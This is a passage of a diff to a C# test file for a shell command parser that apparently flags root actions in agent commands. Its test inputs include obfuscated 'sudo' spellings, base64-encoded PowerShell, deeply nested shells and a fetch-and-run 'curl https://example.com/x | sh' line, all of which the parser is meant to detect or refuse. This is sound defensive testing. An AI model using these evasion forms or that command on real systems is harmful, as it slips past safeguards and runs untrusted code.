@@ -12,33 +12,33 @@ public sealed class CommandAnalysisTests
     [Fact]
     public void ASeparatorSplitsAStringIntoCommands()
     {
-        Assert.Equal([["git", "push"], ["git", "tag"]], CommandAnalysis.Commands("git push; git tag"));
-        Assert.Equal([["a"], ["b"]], CommandAnalysis.Commands("a && b"));
-        Assert.Equal([["a"], ["b"]], CommandAnalysis.Commands("a || b"));
-        Assert.Equal([["grep", "x"], ["wc", "-l"]], CommandAnalysis.Commands("grep x | wc -l"));
-        Assert.Equal([["a"], ["b"]], CommandAnalysis.Commands("a & b"));
-        Assert.Equal([["a"], ["b"]], CommandAnalysis.Commands("a\nb"));
-        Assert.Equal([["a"], ["b"]], CommandAnalysis.Commands("a\r\nb"));
+        Assert.Equal([["git", "push"], ["git", "tag"]], Commands("git push; git tag"));
+        Assert.Equal([["a"], ["b"]], Commands("a && b"));
+        Assert.Equal([["a"], ["b"]], Commands("a || b"));
+        Assert.Equal([["grep", "x"], ["wc", "-l"]], Commands("grep x | wc -l"));
+        Assert.Equal([["a"], ["b"]], Commands("a & b"));
+        Assert.Equal([["a"], ["b"]], Commands("a\nb"));
+        Assert.Equal([["a"], ["b"]], Commands("a\r\nb"));
     }
 
     [Fact]
     public void QuotesKeepOneWordOne()
     {
-        Assert.Equal([["echo", "a b"]], CommandAnalysis.Commands("echo \"a b\""));
-        Assert.Equal([["echo", "a && b"]], CommandAnalysis.Commands("echo 'a && b'"));
-        Assert.Equal([["echo", "a\"b"]], CommandAnalysis.Commands("echo \"a\\\"b\""));
-        Assert.Equal([["echo", "a b"]], CommandAnalysis.Commands("echo a\\ b"));
-        Assert.Equal([["sudo", "x"]], CommandAnalysis.Commands("\\sudo x"));
-        Assert.Equal([["sudo", "x"]], CommandAnalysis.Commands("su\\do x"));
-        Assert.Equal([["echo", "C:\\Users\\dev"]], CommandAnalysis.Commands("echo \"C:\\Users\\dev\""));
+        Assert.Equal([["echo", "a b"]], Commands("echo \"a b\""));
+        Assert.Equal([["echo", "a && b"]], Commands("echo 'a && b'"));
+        Assert.Equal([["echo", "a\"b"]], Commands("echo \"a\\\"b\""));
+        Assert.Equal([["echo", "a b"]], Commands("echo a\\ b"));
+        Assert.Equal([["sudo", "x"]], Commands("\\sudo x"));
+        Assert.Equal([["sudo", "x"]], Commands("su\\do x"));
+        Assert.Equal([["echo", "C:\\Users\\dev"]], Commands("echo \"C:\\Users\\dev\""));
     }
 
     [Fact]
     public void ASeparatorInsideQuotesIsAnArgument_EvenAfterASubstitution()
     {
-        Assert.Equal([["echo", "a;b"]], CommandAnalysis.Commands("echo \"a;b\""));
-        Assert.Equal([["true"], ["echo", "$(true)", "rm x; sudo y"]], CommandAnalysis.Commands("echo \"$(true)\" \"rm x; sudo y\""));
-        Assert.Equal([["true"], ["echo", "$(true); sudo y"]], CommandAnalysis.Commands("echo \"$(true); sudo y\""));
+        Assert.Equal([["echo", "a;b"]], Commands("echo \"a;b\""));
+        Assert.Equal([["true"], ["echo", "$(true)", "rm x; sudo y"]], Commands("echo \"$(true)\" \"rm x; sudo y\""));
+        Assert.Equal([["true"], ["echo", "$(true); sudo y"]], Commands("echo \"$(true); sudo y\""));
     }
 
     [Fact]
@@ -46,85 +46,88 @@ public sealed class CommandAnalysisTests
     {
         // Each body runs before the command it stands in, whose word keeps the substitution's text: the
         // word is the expansion it is.
-        Assert.Equal([["sudo", "b"], ["echo", "$(sudo b)"]], CommandAnalysis.Commands("echo \"$(sudo b)\""));
-        Assert.Equal([["sudo", "b"], ["echo", "$(sudo b)"]], CommandAnalysis.Commands("echo `sudo b`"));
-        Assert.Equal([["git", "push"], ["true"], ["echo", "$(git push)", "$(true)"]], CommandAnalysis.Commands("echo \"$(git push)\" `true`"));
-        Assert.Equal([["date"], ["git", "commit", "-m", "at $(date)"]], CommandAnalysis.Commands("git commit -m \"at $(date)\""));
+        Assert.Equal([["sudo", "b"], ["echo", "$(sudo b)"]], Commands("echo \"$(sudo b)\""));
+        Assert.Equal([["sudo", "b"], ["echo", "$(sudo b)"]], Commands("echo `sudo b`"));
+        Assert.Equal([["git", "push"], ["true"], ["echo", "$(git push)", "$(true)"]], Commands("echo \"$(git push)\" `true`"));
+        Assert.Equal([["date"], ["git", "commit", "-m", "at $(date)"]], Commands("git commit -m \"at $(date)\""));
     }
 
     [Fact]
     public void ASubshellAndALoopAndABranchBodyAreCommandsOfTheirOwn()
     {
-        Assert.Equal([["a"], ["b"]], CommandAnalysis.Commands("(a && b)"));
-        Assert.Equal([["for", "x", "in", "a"], ["sudo", "x"]], CommandAnalysis.Commands("for x in a; do sudo x; done"));
-        Assert.Equal([["select", "x", "in", "a", "b"], ["echo", "$x"]], CommandAnalysis.Commands("select x in a b\ndo echo $x; done"));
-        Assert.Equal([["echo", "$x"]], CommandAnalysis.Commands("case $1 in (a|sudo) echo $x;; b) ;; esac"));
-        Assert.Equal([["[", "-f", "x", "]"], ["rm", "x"]], CommandAnalysis.Commands("if [ -f x ]; then rm x; fi"));
-        Assert.Equal([["true"], ["sudo", "x"], ["break"]], CommandAnalysis.Commands("while true; do sudo x; break; done"));
+        Assert.Equal([["a"], ["b"]], Commands("(a && b)"));
+        Assert.Equal([["for", "x", "in", "a"], ["sudo", "x"]], Commands("for x in a; do sudo x; done"));
+        Assert.Equal([["select", "x", "in", "a", "b"], ["echo", "$x"]], Commands("select x in a b\ndo echo $x; done"));
+        Assert.Equal([["echo", "$x"]], Commands("case $1 in (a|sudo) echo $x;; b) ;; esac"));
+        Assert.Equal([["[", "-f", "x", "]"], ["rm", "x"]], Commands("if [ -f x ]; then rm x; fi"));
+        Assert.Equal([["true"], ["sudo", "x"], ["break"]], Commands("while true; do sudo x; break; done"));
     }
 
     [Fact]
     public void WrappersAreStrippedWithTheirOwnOptions()
     {
-        Assert.Equal([["A=1", "git", "push"]], CommandAnalysis.Commands("env A=1 git push"));
-        Assert.Equal([["A=1", "git", "push"]], CommandAnalysis.Commands("env -u B A=1 git push"));
-        Assert.Equal([["git", "push"]], CommandAnalysis.Commands("nohup git push"));
-        Assert.Equal([["git", "push"]], CommandAnalysis.Commands("time -p git push"));
-        Assert.Equal([["git", "push"]], CommandAnalysis.Commands("timeout 5 git push"));
-        Assert.Equal([["git", "push"]], CommandAnalysis.Commands("timeout --foreground 5m git push"));
-        Assert.Equal([["git", "push"]], CommandAnalysis.Commands("nice -n 5 git push"));
-        Assert.Equal([["git", "push"]], CommandAnalysis.Commands("nice -5 git push"));
-        Assert.Equal([["git", "push"]], CommandAnalysis.Commands("xargs -I{} git push"));
-        Assert.Equal([["git", "push"]], CommandAnalysis.Commands("command -v git push"));
-        Assert.Equal([["sudo", "x"]], CommandAnalysis.Commands("exec sudo x"));
-        Assert.Equal([["sudo", "x"]], CommandAnalysis.Commands("eval \"sudo x\""));
-        Assert.Equal([["A=1", "sudo", "x"]], CommandAnalysis.Commands("nohup env A=1 timeout 5 sudo x"));
-        Assert.Empty(CommandAnalysis.Commands("nice"));
+        Assert.Equal([["A=1", "git", "push"]], Commands("env A=1 git push"));
+        Assert.Equal([["A=1", "git", "push"]], Commands("env -u B A=1 git push"));
+        Assert.Equal([["git", "push"]], Commands("nohup git push"));
+        Assert.Equal([["git", "push"]], Commands("time -p git push"));
+        Assert.Equal([["git", "push"]], Commands("timeout 5 git push"));
+        Assert.Equal([["git", "push"]], Commands("timeout --foreground 5m git push"));
+        Assert.Equal([["git", "push"]], Commands("nice -n 5 git push"));
+        Assert.Equal([["git", "push"]], Commands("nice -5 git push"));
+        Assert.Equal([["git", "push"]], Commands("xargs -I{} git push"));
+        Assert.Equal([["command", "-v", "git", "push"]], Commands("command -v git push"));
+        Assert.Equal([["command", "-v", "bash"]], Commands("command -v bash"));
+        Assert.Equal([["git", "push"]], Commands("env -v git push"));
+        Assert.Equal([["git", "push"]], Commands("env -C dir -a name git push"));
+        Assert.Equal([["sudo", "x"]], Commands("exec sudo x"));
+        Assert.Equal([["sudo", "x"]], Commands("eval \"sudo x\""));
+        Assert.Equal([["A=1", "sudo", "x"]], Commands("nohup env A=1 timeout 5 sudo x"));
+        Assert.Empty(Commands("nice"));
     }
 
     [Fact]
     public void EnvSplitStringIsReadAsTheCommandLineItIs()
     {
-        Assert.Equal([["sudo", "x"]], CommandAnalysis.Commands((IReadOnlyList<string>)["env", "-S", "sudo x"]));
-        Assert.Equal([["sudo", "x"]], CommandAnalysis.Commands((IReadOnlyList<string>)["env", "-Ssudo x"]));
-        Assert.Equal([["A=1", "sudo", "x"]], CommandAnalysis.Commands((IReadOnlyList<string>)["env", "A=1", "--split-string=sudo x"]));
+        Assert.Equal([["sudo", "x"]], Commands((IReadOnlyList<string>)["env", "-S", "sudo x"]));
+        Assert.Equal([["sudo", "x"]], Commands((IReadOnlyList<string>)["env", "-Ssudo x"]));
+        Assert.Equal([["A=1", "sudo", "x"]], Commands((IReadOnlyList<string>)["env", "A=1", "--split-string=sudo x"]));
 
         // The words after the string are the same command's: env -S 'git -C x' push runs git push.
-        Assert.Equal([["git", "-C", "x", "push"]], CommandAnalysis.Commands((IReadOnlyList<string>)["env", "-S", "git -C x", "push"]));
+        Assert.Equal([["git", "-C", "x", "push"]], Commands((IReadOnlyList<string>)["env", "-S", "git -C x", "push"]));
     }
 
     [Fact]
     public void ALeadingAssignmentIsTheCommandsEnvironment_NeverItsProgram()
     {
-        Assert.Equal([["A=1", "B=2", "git", "push"]], CommandAnalysis.Commands("A=1 B=2 git push"));
-        Assert.Equal([["A=1", "git", "push"]], CommandAnalysis.Commands((IReadOnlyList<string>)["A=1", "git", "push"]));
+        Assert.Equal([["A=1", "B=2", "git", "push"]], Commands("A=1 B=2 git push"));
+        Assert.Equal([["A=1", "git", "push"]], Commands((IReadOnlyList<string>)["A=1", "git", "push"]));
         Assert.Equal(2, CommandAnalysis.EnvironmentOf(["A=1", "_B=2", "git"]));
         Assert.Equal(0, CommandAnalysis.EnvironmentOf(["1A=1", "git"]));
 
         // Carried to what the command runs: a script's commands run in it too.
-        Assert.Equal([["GIT_CONFIG_COUNT=1", "git", "x"]], CommandAnalysis.Commands("GIT_CONFIG_COUNT=1 sh -c 'git x'"));
+        Assert.Equal([["GIT_CONFIG_COUNT=1", "git", "x"]], Commands("GIT_CONFIG_COUNT=1 sh -c 'git x'"));
 
         // An assignment alone runs nothing, and stays a command of its own for the rules on a path.
-        Assert.Equal([["A=1"]], CommandAnalysis.Commands("A=1"));
+        Assert.Equal([["A=1"]], Commands("A=1"));
     }
 
     [Fact]
     public void AShellScriptTheCommandNamesIsGoneInto()
     {
-        Assert.Equal([["a"], ["sudo", "b"]], CommandAnalysis.Commands("sh -c 'a && sudo b'"));
-        Assert.Equal([["a"], ["b"]], CommandAnalysis.Commands("bash -lc \"a; b\""));
-        Assert.Equal([["a"], ["b"]], CommandAnalysis.Commands("zsh -c 'a\nb'"));
+        Assert.Equal([["a"], ["sudo", "b"]], Commands("sh -c 'a && sudo b'"));
+        Assert.Equal([["a"], ["b"]], Commands("bash -lc \"a; b\""));
+        Assert.Equal([["a"], ["b"]], Commands("zsh -c 'a\nb'"));
     }
 
     [Fact]
     public void CmdAndPowerShellAreGoneInto_AnEncodedCommandDecoded()
     {
-        Assert.Equal([["a"], ["b"]], CommandAnalysis.Commands("cmd /c \"a & b\""));
-        Assert.Equal([["rm", "x"], ["sudo", "y"]], CommandAnalysis.Commands("powershell -Command \"rm x; sudo y\""));
-        Assert.Equal([["sudo", "y"]], CommandAnalysis.Commands("pwsh -c \"sudo y\""));
+        Assert.Equal([["a"], ["b"]], Commands("cmd /c \"a & b\""));
+        Assert.Equal([["rm", "x"], ["sudo", "y"]], Commands("powershell -Command \"rm x; sudo y\""));
+        Assert.Equal([["sudo", "y"]], Commands("pwsh -c \"sudo y\""));
 
         var encoded = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes("sudo x"));
-        Assert.Equal([["sudo", "x"]], CommandAnalysis.Commands($"pwsh -EncodedCommand {encoded}"));
+        Assert.Equal([["sudo", "x"]], Commands($"pwsh -EncodedCommand {encoded}"));
     }
 
     [Fact]
@@ -137,12 +140,12 @@ public sealed class CommandAnalysisTests
             script = $"sh -c \"{script.Replace("\\", "\\\\").Replace("\"", "\\\"")}\"";
         }
 
-        Assert.Equal([["sudo", "x"]], CommandAnalysis.Commands(script));
+        Assert.Equal([["sudo", "x"]], Commands(script));
 
         var deeper = $"sh -c \"{script.Replace("\\", "\\\\").Replace("\"", "\\\"")}\"";
 
         // The fifth going-in is not made, and what it would hide is not left as words: refused.
-        var refused = Assert.Throws<NotSupportedException>(() => CommandAnalysis.Commands(deeper));
+        var refused = Assert.Throws<NotSupportedException>(() => Commands(deeper));
 
         Assert.Contains("is a script nested past 4 levels of going into, which this does not read", refused.Message, StringComparison.Ordinal);
     }
@@ -150,63 +153,151 @@ public sealed class CommandAnalysisTests
     [Fact]
     public void ParenthesesNestedPastTheBound_AreRefused_NeverACrash()
     {
-        var deep = string.Concat(Enumerable.Repeat("(", 20000)) + "sudo x" + string.Concat(Enumerable.Repeat(")", 20000));
+        var deep = string.Concat(Enumerable.Repeat("( ", 20000)) + "sudo x" + string.Concat(Enumerable.Repeat(")", 20000));
         var substituted = string.Concat(Enumerable.Repeat("echo $(", 20000)) + "x" + string.Concat(Enumerable.Repeat(")", 20000));
 
-        Assert.Contains("nest past 32 levels", Assert.Throws<NotSupportedException>(() => CommandAnalysis.Commands(deep)).Message, StringComparison.Ordinal);
-        Assert.Contains("nest past 32 levels", Assert.Throws<NotSupportedException>(() => CommandAnalysis.Commands(substituted)).Message, StringComparison.Ordinal);
+        Assert.Contains("nest past 32 levels", Assert.Throws<NotSupportedException>(() => Commands(deep)).Message, StringComparison.Ordinal);
+        Assert.Contains("nest past 32 levels", Assert.Throws<NotSupportedException>(() => Commands(substituted)).Message, StringComparison.Ordinal);
+
+        // Arithmetic's parentheses are counted, never gone into: however deep, it runs nothing of its own.
+        Assert.Empty(Commands(string.Concat(Enumerable.Repeat("(", 20000)) + "1" + string.Concat(Enumerable.Repeat(")", 20000))));
     }
 
     [Fact]
     public void TheInsideOfAScriptFileIsNotRead()
     {
-        Assert.Equal([["bash", "script.sh"]], CommandAnalysis.Commands("bash script.sh"));
-        Assert.Equal([["pwsh", "-File", "run.ps1"]], CommandAnalysis.Commands("pwsh -File run.ps1"));
+        Assert.Equal([["bash", "script.sh"]], Commands("bash script.sh"));
+        Assert.Equal([["pwsh", "-File", "run.ps1"]], Commands("pwsh -File run.ps1"));
     }
 
     [Fact]
     public void AnArgumentListIsFlattenedAsTheCommandItNames()
     {
-        Assert.Equal([["git", "-C", "x", "push"]], CommandAnalysis.Commands((IReadOnlyList<string>)["git", "-C", "x", "push"]));
-        Assert.Equal([["sudo", "b"]], CommandAnalysis.Commands((IReadOnlyList<string>)["bash", "-c", "sudo b"]));
-        Assert.Equal([["A=1", "git", "push"]], CommandAnalysis.Commands((IReadOnlyList<string>)["env", "A=1", "git", "push"]));
+        Assert.Equal([["git", "-C", "x", "push"]], Commands((IReadOnlyList<string>)["git", "-C", "x", "push"]));
+        Assert.Equal([["sudo", "b"]], Commands((IReadOnlyList<string>)["bash", "-c", "sudo b"]));
+        Assert.Equal([["A=1", "git", "push"]], Commands((IReadOnlyList<string>)["env", "A=1", "git", "push"]));
     }
 
     [Fact]
     public void ARedirectsFileIsAWord_ItsOperatorBeforeIt()
     {
-        Assert.Equal([["echo", "x", ">out.txt"]], CommandAnalysis.Commands("echo x >out.txt"));
-        Assert.Equal([["echo", "x", ">out.txt"]], CommandAnalysis.Commands("echo x > out.txt"));
-        Assert.Equal([["echo", "x", ">>err.txt"]], CommandAnalysis.Commands("echo x 2>>err.txt"));
-        Assert.Equal([["echo", "x", ">err.txt"]], CommandAnalysis.Commands("echo x &>err.txt"));
+        Assert.Equal([["echo", "x", ">out.txt"]], Commands("echo x >out.txt"));
+        Assert.Equal([["echo", "x", ">out.txt"]], Commands("echo x > out.txt"));
+        Assert.Equal([["echo", "x", ">>err.txt"]], Commands("echo x 2>>err.txt"));
+        Assert.Equal([["echo", "x", ">err.txt"]], Commands("echo x &>err.txt"));
 
         // A redirect stands wherever the command's words do, and is kept after them.
-        Assert.Equal([["git", "push", ">/dev/null"]], CommandAnalysis.Commands("git 2>/dev/null push"));
-        Assert.Equal([["git", "push", ">/dev/null"]], CommandAnalysis.Commands(">/dev/null git push"));
-        Assert.Equal([["grep", "x"], ["wc"]], CommandAnalysis.Commands("grep x 2>&1 | wc"));
+        Assert.Equal([["git", "push", ">/dev/null"]], Commands("git 2>/dev/null push"));
+        Assert.Equal([["git", "push", ">/dev/null"]], Commands(">/dev/null git push"));
+        Assert.Equal([["grep", "x"], ["wc"]], Commands("grep x 2>&1 | wc"));
 
         // Glued to the word before it, the operator still begins a word of its own.
-        Assert.Equal([["echo", "x", ">~/.claude/a"]], CommandAnalysis.Commands("echo x>~/.claude/a"));
-        Assert.Equal([["cat", "<in.txt"]], CommandAnalysis.Commands("cat<in.txt"));
+        Assert.Equal([["echo", "x", ">~/.claude/a"]], Commands("echo x>~/.claude/a"));
+        Assert.Equal([["cat", "<in.txt"]], Commands("cat<in.txt"));
+
+        // Each is the command's redirect, never a word: its operator folded, its file apart - in a backtick's command too.
+        var command = Assert.Single(CommandAnalysis.Commands("echo x 2>>err.txt <in.txt"));
+        Assert.Equal(["echo", "x"], command.Words);
+        Assert.Equal([new ShellRedirect(2, ">>", "err.txt"), new ShellRedirect(0, "<", "in.txt")], command.Redirects);
+        Assert.Equal([new ShellRedirect(1, ">", "y")], CommandAnalysis.Commands("echo `cat x >y`")[0].Redirects);
+    }
+
+    [Fact]
+    public void AWordSpelledAsARedirect_IsAWord_AndAScriptBeginningSoIsRead()
+    {
+        // Quoted, it is the word the program is handed; an argument list holds no redirect at all.
+        var quoted = Assert.Single(CommandAnalysis.Commands("echo '>x' \"<y\""));
+        Assert.Equal(["echo", ">x", "<y"], quoted.Words);
+        Assert.Empty(quoted.Redirects);
+        Assert.Empty(Assert.Single(CommandAnalysis.Commands((IReadOnlyList<string>)["echo", ">x"])).Redirects);
+
+        // So a shell's script is the word after its -c, whatever it begins with, and is read.
+        Assert.Contains(["git", "push"], Commands("bash -c '>x; git push'"));
+        Assert.Contains(["git", "push"], Commands((IReadOnlyList<string>)["bash", "-c", ">x; git push"]));
+        Assert.Contains(["git", "push", "<x"], Commands("find . -exec sh -c '<x git push' ';'"));
+
+        // A redirect made for a command whose script is gone into stays a command of its own, its file decided.
+        Assert.Contains([">~/.claude/a"], Commands("bash -c true >~/.claude/a"));
+        Assert.Contains([">~/.claude/a"], Commands("eval true >~/.claude/a"));
     }
 
     [Fact]
     public void ARootActionHiddenByShellSyntax_IsStillACommandsWord()
     {
         // A case pattern's parenthesis, a line continued, ANSI-C quoting and a quoted parenthesis.
-        Assert.Contains(["sudo", "id"], CommandAnalysis.Commands("case x in x) sudo id;; esac"));
-        Assert.Contains(["sudo", "id"], CommandAnalysis.Commands("su\\\ndo id"));
-        Assert.Contains(["sudo", "id"], CommandAnalysis.Commands("$'sudo' id"));
-        Assert.Contains(["sudo", "id"], CommandAnalysis.Commands("$'\\x73udo' id"));
-        Assert.Contains(["sudo", "id"], CommandAnalysis.Commands("(echo \")\"; sudo id)"));
-        Assert.Contains(["sudo", "id"], CommandAnalysis.Commands("echo \"$(printf ')'; sudo id)\""));
-        Assert.Contains(["sudo", "id"], CommandAnalysis.Commands("echo \"$(printf \\); sudo id)\""));
+        Assert.Contains(["sudo", "id"], Commands("case x in x) sudo id;; esac"));
+        Assert.Contains(["sudo", "id"], Commands("su\\\ndo id"));
+        Assert.Contains(["sudo", "id"], Commands("$'sudo' id"));
+        Assert.Contains(["sudo", "id"], Commands("$'\\x73udo' id"));
+        Assert.Contains(["sudo", "id"], Commands("(echo \")\"; sudo id)"));
+        Assert.Contains(["sudo", "id"], Commands("echo \"$(printf ')'; sudo id)\""));
+        Assert.Contains(["sudo", "id"], Commands("echo \"$(printf \\); sudo id)\""));
 
         // cmd's caret and single quote, and PowerShell's backtick, read as those shells read them.
-        Assert.Contains(["sudo", "x"], CommandAnalysis.Commands("cmd /c su^do x"));
-        Assert.Contains(["sudo", "x'"], CommandAnalysis.Commands((IReadOnlyList<string>)["cmd", "/c", "echo 'a & sudo x'"]));
-        Assert.Contains(["sudo", "x"], CommandAnalysis.Commands((IReadOnlyList<string>)["pwsh", "-c", "s`udo x"]));
-        Assert.Contains(["sudo", "x"], CommandAnalysis.Commands((IReadOnlyList<string>)["pwsh", "-c", "\"s`udo\" x"]));
+        Assert.Contains(["sudo", "x"], Commands("cmd /c su^do x"));
+        Assert.Contains(["sudo", "x'"], Commands((IReadOnlyList<string>)["cmd", "/c", "echo 'a & sudo x'"]));
+        Assert.Contains(["sudo", "x"], Commands((IReadOnlyList<string>)["pwsh", "-c", "s`udo x"]));
+        Assert.Contains(["sudo", "x"], Commands((IReadOnlyList<string>)["pwsh", "-c", "& \"s`udo\" x"]));
+
+        // PowerShell's words split where its tokenizer splits them: a doubled quote inside its own quotes, a quoted
+        // word ending its word, a script block's last command ended by its brace, a braced variable whole.
+        Assert.Contains(["git", "commit", "-m", "a\"b"], Commands((IReadOnlyList<string>)["pwsh", "-c", "git commit -m \"a\"\"b\""]));
+        Assert.Contains(["git", "commit", "-m", "a'b"], Commands((IReadOnlyList<string>)["pwsh", "-c", "git commit -m 'a''b'"]));
+        Assert.Contains(["git", "commit", "-m", "x", "y"], Commands((IReadOnlyList<string>)["pwsh", "-c", "git commit -m 'x'y"]));
+        Assert.Contains(["git", "commit", "-m", "x", "y"], Commands((IReadOnlyList<string>)["pwsh", "-c", "git commit -m \"x\"y"]));
+        Assert.Contains(["echo", "a"], Commands((IReadOnlyList<string>)["pwsh", "-c", "echo a;#it's"]));
+        Assert.Contains(["git", "status"], Commands((IReadOnlyList<string>)["pwsh", "-c", "echo a,#it's\ngit status"]));
+        Assert.Contains(["echo", ""], Commands((IReadOnlyList<string>)["pwsh", "-c", "echo @'\n'@"]));
+        Assert.Contains(["git", "commit", "-m", "xyz"], Commands((IReadOnlyList<string>)["pwsh", "-c", "git commit -m x'y'z"]));
+        Assert.Contains(["npm", "publish"], Commands((IReadOnlyList<string>)["pwsh", "-c", "&{npm publish}"]));
+        Assert.Contains(["echo", "$env:X"], Commands((IReadOnlyList<string>)["pwsh", "-c", "echo ${env:X}"]));
+        Assert.Contains(["echo", "a#b"], Commands((IReadOnlyList<string>)["pwsh", "-c", "echo a#b"]));
+        Assert.Contains(["echo", "a"], Commands((IReadOnlyList<string>)["pwsh", "-c", "echo 'a'#b"]));
+        Assert.Contains(["echo", "a"], Commands((IReadOnlyList<string>)["pwsh", "-c", "echo a <# b'c #>"]));
+        Assert.Contains(["echo", "a\nit's \"q\""], Commands((IReadOnlyList<string>)["pwsh", "-c", "echo @'\na\nit's \"q\"\n'@"]));
+        Assert.Contains(["echo", "  '@\nx"], Commands((IReadOnlyList<string>)["pwsh", "-c", "echo @'\n  '@\nx\n'@"]));
+        Assert.Contains(["git", "status"], Commands((IReadOnlyList<string>)["pwsh", "-c", "echo @\"\nx\"y\" $(git status)\n\"@"]));
+        Assert.StartsWith("x\"y\" $(", Commands((IReadOnlyList<string>)["pwsh", "-c", "echo @\"\nx\"y\" $(git status)\n\"@"])[^1][1], StringComparison.Ordinal);
+        Assert.Contains(["git", "status"], Commands((IReadOnlyList<string>)["pwsh", "-c", "echo \"$(git status)\""]));
+
+        // A subexpression glued into a bareword is one word with it; an expression is data, a number no program; an
+        // escape and a dash are PowerShell's; % and ? are the cmdlets they spell.
+        Assert.Equal(2, Commands((IReadOnlyList<string>)["pwsh", "-c", "echo a$(git status)"])[^1].Count);
+        Assert.Equal(2, Commands((IReadOnlyList<string>)["pwsh", "-c", "echo $(git status)x"])[^1].Count);
+        Assert.Equal([["echo"]], Commands((IReadOnlyList<string>)["pwsh", "-c", "1 + 2"]));
+        Assert.Contains(["7z", "a", "x.zip"], Commands((IReadOnlyList<string>)["pwsh", "-c", "7z a x.zip"]));
+        Assert.Contains(["echo", "a\nb"], Commands((IReadOnlyList<string>)["pwsh", "-c", "echo a`nb"]));
+        Assert.Contains(["echo", "${PSVALUE}"], Commands((IReadOnlyList<string>)["pwsh", "-c", "echo ${a`}b}"]));
+        Assert.Contains(["git", "push", "--force"], Commands((IReadOnlyList<string>)["pwsh", "-c", "git push \u2013-force"]));
+        Assert.Contains(["Where-Object", "Kill"], Commands((IReadOnlyList<string>)["pwsh", "-c", "Get-Process | ? Kill"]));
+        Assert.Contains(["git", "push", "origin", "main"], Commands((IReadOnlyList<string>)["pwsh", "-c", "git`\npush origin main"]));
+        Assert.Contains(["git", "status", ">x"], Commands((IReadOnlyList<string>)["pwsh", "-c", "git status 2> x"]));
+        Assert.Contains(["ForEach-Object", "Kill"], Commands((IReadOnlyList<string>)["pwsh", "-c", "Get-Process | % Kill"]));
+
+        // What PowerShell itself refuses to read - a here-string's header with more on its line, a block comment never
+        // closed - is refused, never read past.
+        Assert.Throws<NotSupportedException>(() => Commands((IReadOnlyList<string>)["pwsh", "-c", "echo @'x'@"]));
+        Assert.Throws<NotSupportedException>(() => Commands((IReadOnlyList<string>)["pwsh", "-c", "echo @'x\n'@"]));
+        Assert.Throws<NotSupportedException>(() => Commands((IReadOnlyList<string>)["pwsh", "-c", "echo <# x"]));
+        Assert.Throws<NotSupportedException>(() => Commands((IReadOnlyList<string>)["pwsh", "-c", "echo x >"]));
+        Assert.Throws<NotSupportedException>(() => Commands((IReadOnlyList<string>)["pwsh", "-c", "echo `u{D800}"]));
+        Assert.Throws<NotSupportedException>(() => Commands((IReadOnlyList<string>)["pwsh", "-c", "echo `u{110000}"]));
+
+        // Invoke-Expression's one string is a script of its own, to four levels as a script gone into is.
+        var nested = "git status";
+
+        for (var level = 0; level < CommandAnalysis.Depth; level++)
+        {
+            nested = $"iex '{nested.Replace("'", "''", StringComparison.Ordinal)}'";
+        }
+
+        Assert.Contains(["git", "status"], Commands((IReadOnlyList<string>)["pwsh", "-c", nested]));
+        Assert.Contains(
+            $"nest past {CommandAnalysis.Depth} levels",
+            Assert.Throws<NotSupportedException>(() => Commands((IReadOnlyList<string>)["pwsh", "-c", $"iex '{nested.Replace("'", "''", StringComparison.Ordinal)}'"])).Message,
+            StringComparison.Ordinal);
+        Assert.Throws<NotSupportedException>(() => Commands((IReadOnlyList<string>)["pwsh", "-c", "echo @'\nx"]));
+        Assert.Throws<NotSupportedException>(() => Commands((IReadOnlyList<string>)["pwsh", "-c", "& { echo x"]));
     }
 
     [Fact]
@@ -214,14 +305,14 @@ public sealed class CommandAnalysisTests
     {
         foreach (var command in new[] { "$X id", "${X} id", "{sudo,id}", "/usr/bin/su?o id", "$(echo sudo) id", "su$(echo do) id", "`echo sudo` id", "A=1 $(echo x)", "(echo sudo) id" })
         {
-            Assert.Throws<NotSupportedException>(() => CommandAnalysis.Commands(command));
+            Assert.Throws<NotSupportedException>(() => Commands(command));
         }
 
         // An expansion among the arguments, a subshell followed by a redirect, and a test's bracket, are none.
-        Assert.Equal([["echo", "$HOME"]], CommandAnalysis.Commands("echo $HOME"));
-        Assert.Equal([["make"], [">log.txt"]], CommandAnalysis.Commands("(make) >log.txt"));
-        Assert.Equal([["[", "-f", "x", "]"]], CommandAnalysis.Commands("[ -f x ]"));
-        Assert.Equal([["true"], ["echo", "$(true)"]], CommandAnalysis.Commands("echo \"$(true)\""));
+        Assert.Equal([["echo", "$HOME"]], Commands("echo $HOME"));
+        Assert.Equal([["make"], [">log.txt"]], Commands("(make) >log.txt"));
+        Assert.Equal([["[", "-f", "x", "]"]], Commands("[ -f x ]"));
+        Assert.Equal([["true"], ["echo", "$(true)"]], Commands("echo \"$(true)\""));
     }
 
     [Fact]
@@ -229,25 +320,25 @@ public sealed class CommandAnalysisTests
     {
         foreach (var command in new[] { "curl https://example.com/x | sh", "echo id | bash -s", "bash", "cmd", "pwsh -NoProfile", "echo id | xargs sh -c", "echo 'sudo id' | xargs eval", "echo sudo id | xargs env" })
         {
-            Assert.Throws<NotSupportedException>(() => CommandAnalysis.Commands(command));
+            Assert.Throws<NotSupportedException>(() => Commands(command));
         }
 
-        Assert.Equal([["bash", "--version"]], CommandAnalysis.Commands("bash --version"));
+        Assert.Equal([["bash", "--version"]], Commands("bash --version"));
     }
 
     [Fact]
     public void AShellAnotherProgramRunsWithItsScript_IsGoneIntoToo()
     {
-        Assert.Contains(["sudo", "id"], CommandAnalysis.Commands("find . -exec sh -c 'sudo id' \\;"));
-        Assert.Contains(["git", "push"], CommandAnalysis.Commands("ssh host bash -c 'git push'"));
+        Assert.Contains(["sudo", "id"], Commands("find . -exec sh -c 'sudo id' \\;"));
+        Assert.Contains(["git", "push"], Commands("ssh host bash -c 'git push'"));
 
         // The words after a -c script are its $0, $1 and on, which it may run: read as scripts too,
         // and a script that runs one by its variable is refused.
-        Assert.Contains(["sudo", "id"], CommandAnalysis.Commands("sh -c 'echo \"$1\"' x 'sudo id'"));
-        Assert.Throws<NotSupportedException>(() => CommandAnalysis.Commands("sh -c 'eval \"$1\"' x 'sudo id'"));
+        Assert.Contains(["sudo", "id"], Commands("sh -c 'echo \"$1\"' x 'sudo id'"));
+        Assert.Throws<NotSupportedException>(() => Commands("sh -c 'eval \"$1\"' x 'sudo id'"));
 
         // A shell's own option and its value come before its script.
-        Assert.Contains(["sudo", "id"], CommandAnalysis.Commands("bash -o pipefail -c 'sudo id'"));
+        Assert.Contains(["sudo", "id"], Commands("bash -o pipefail -c 'sudo id'"));
     }
 
     [Fact]
@@ -257,57 +348,66 @@ public sealed class CommandAnalysisTests
 
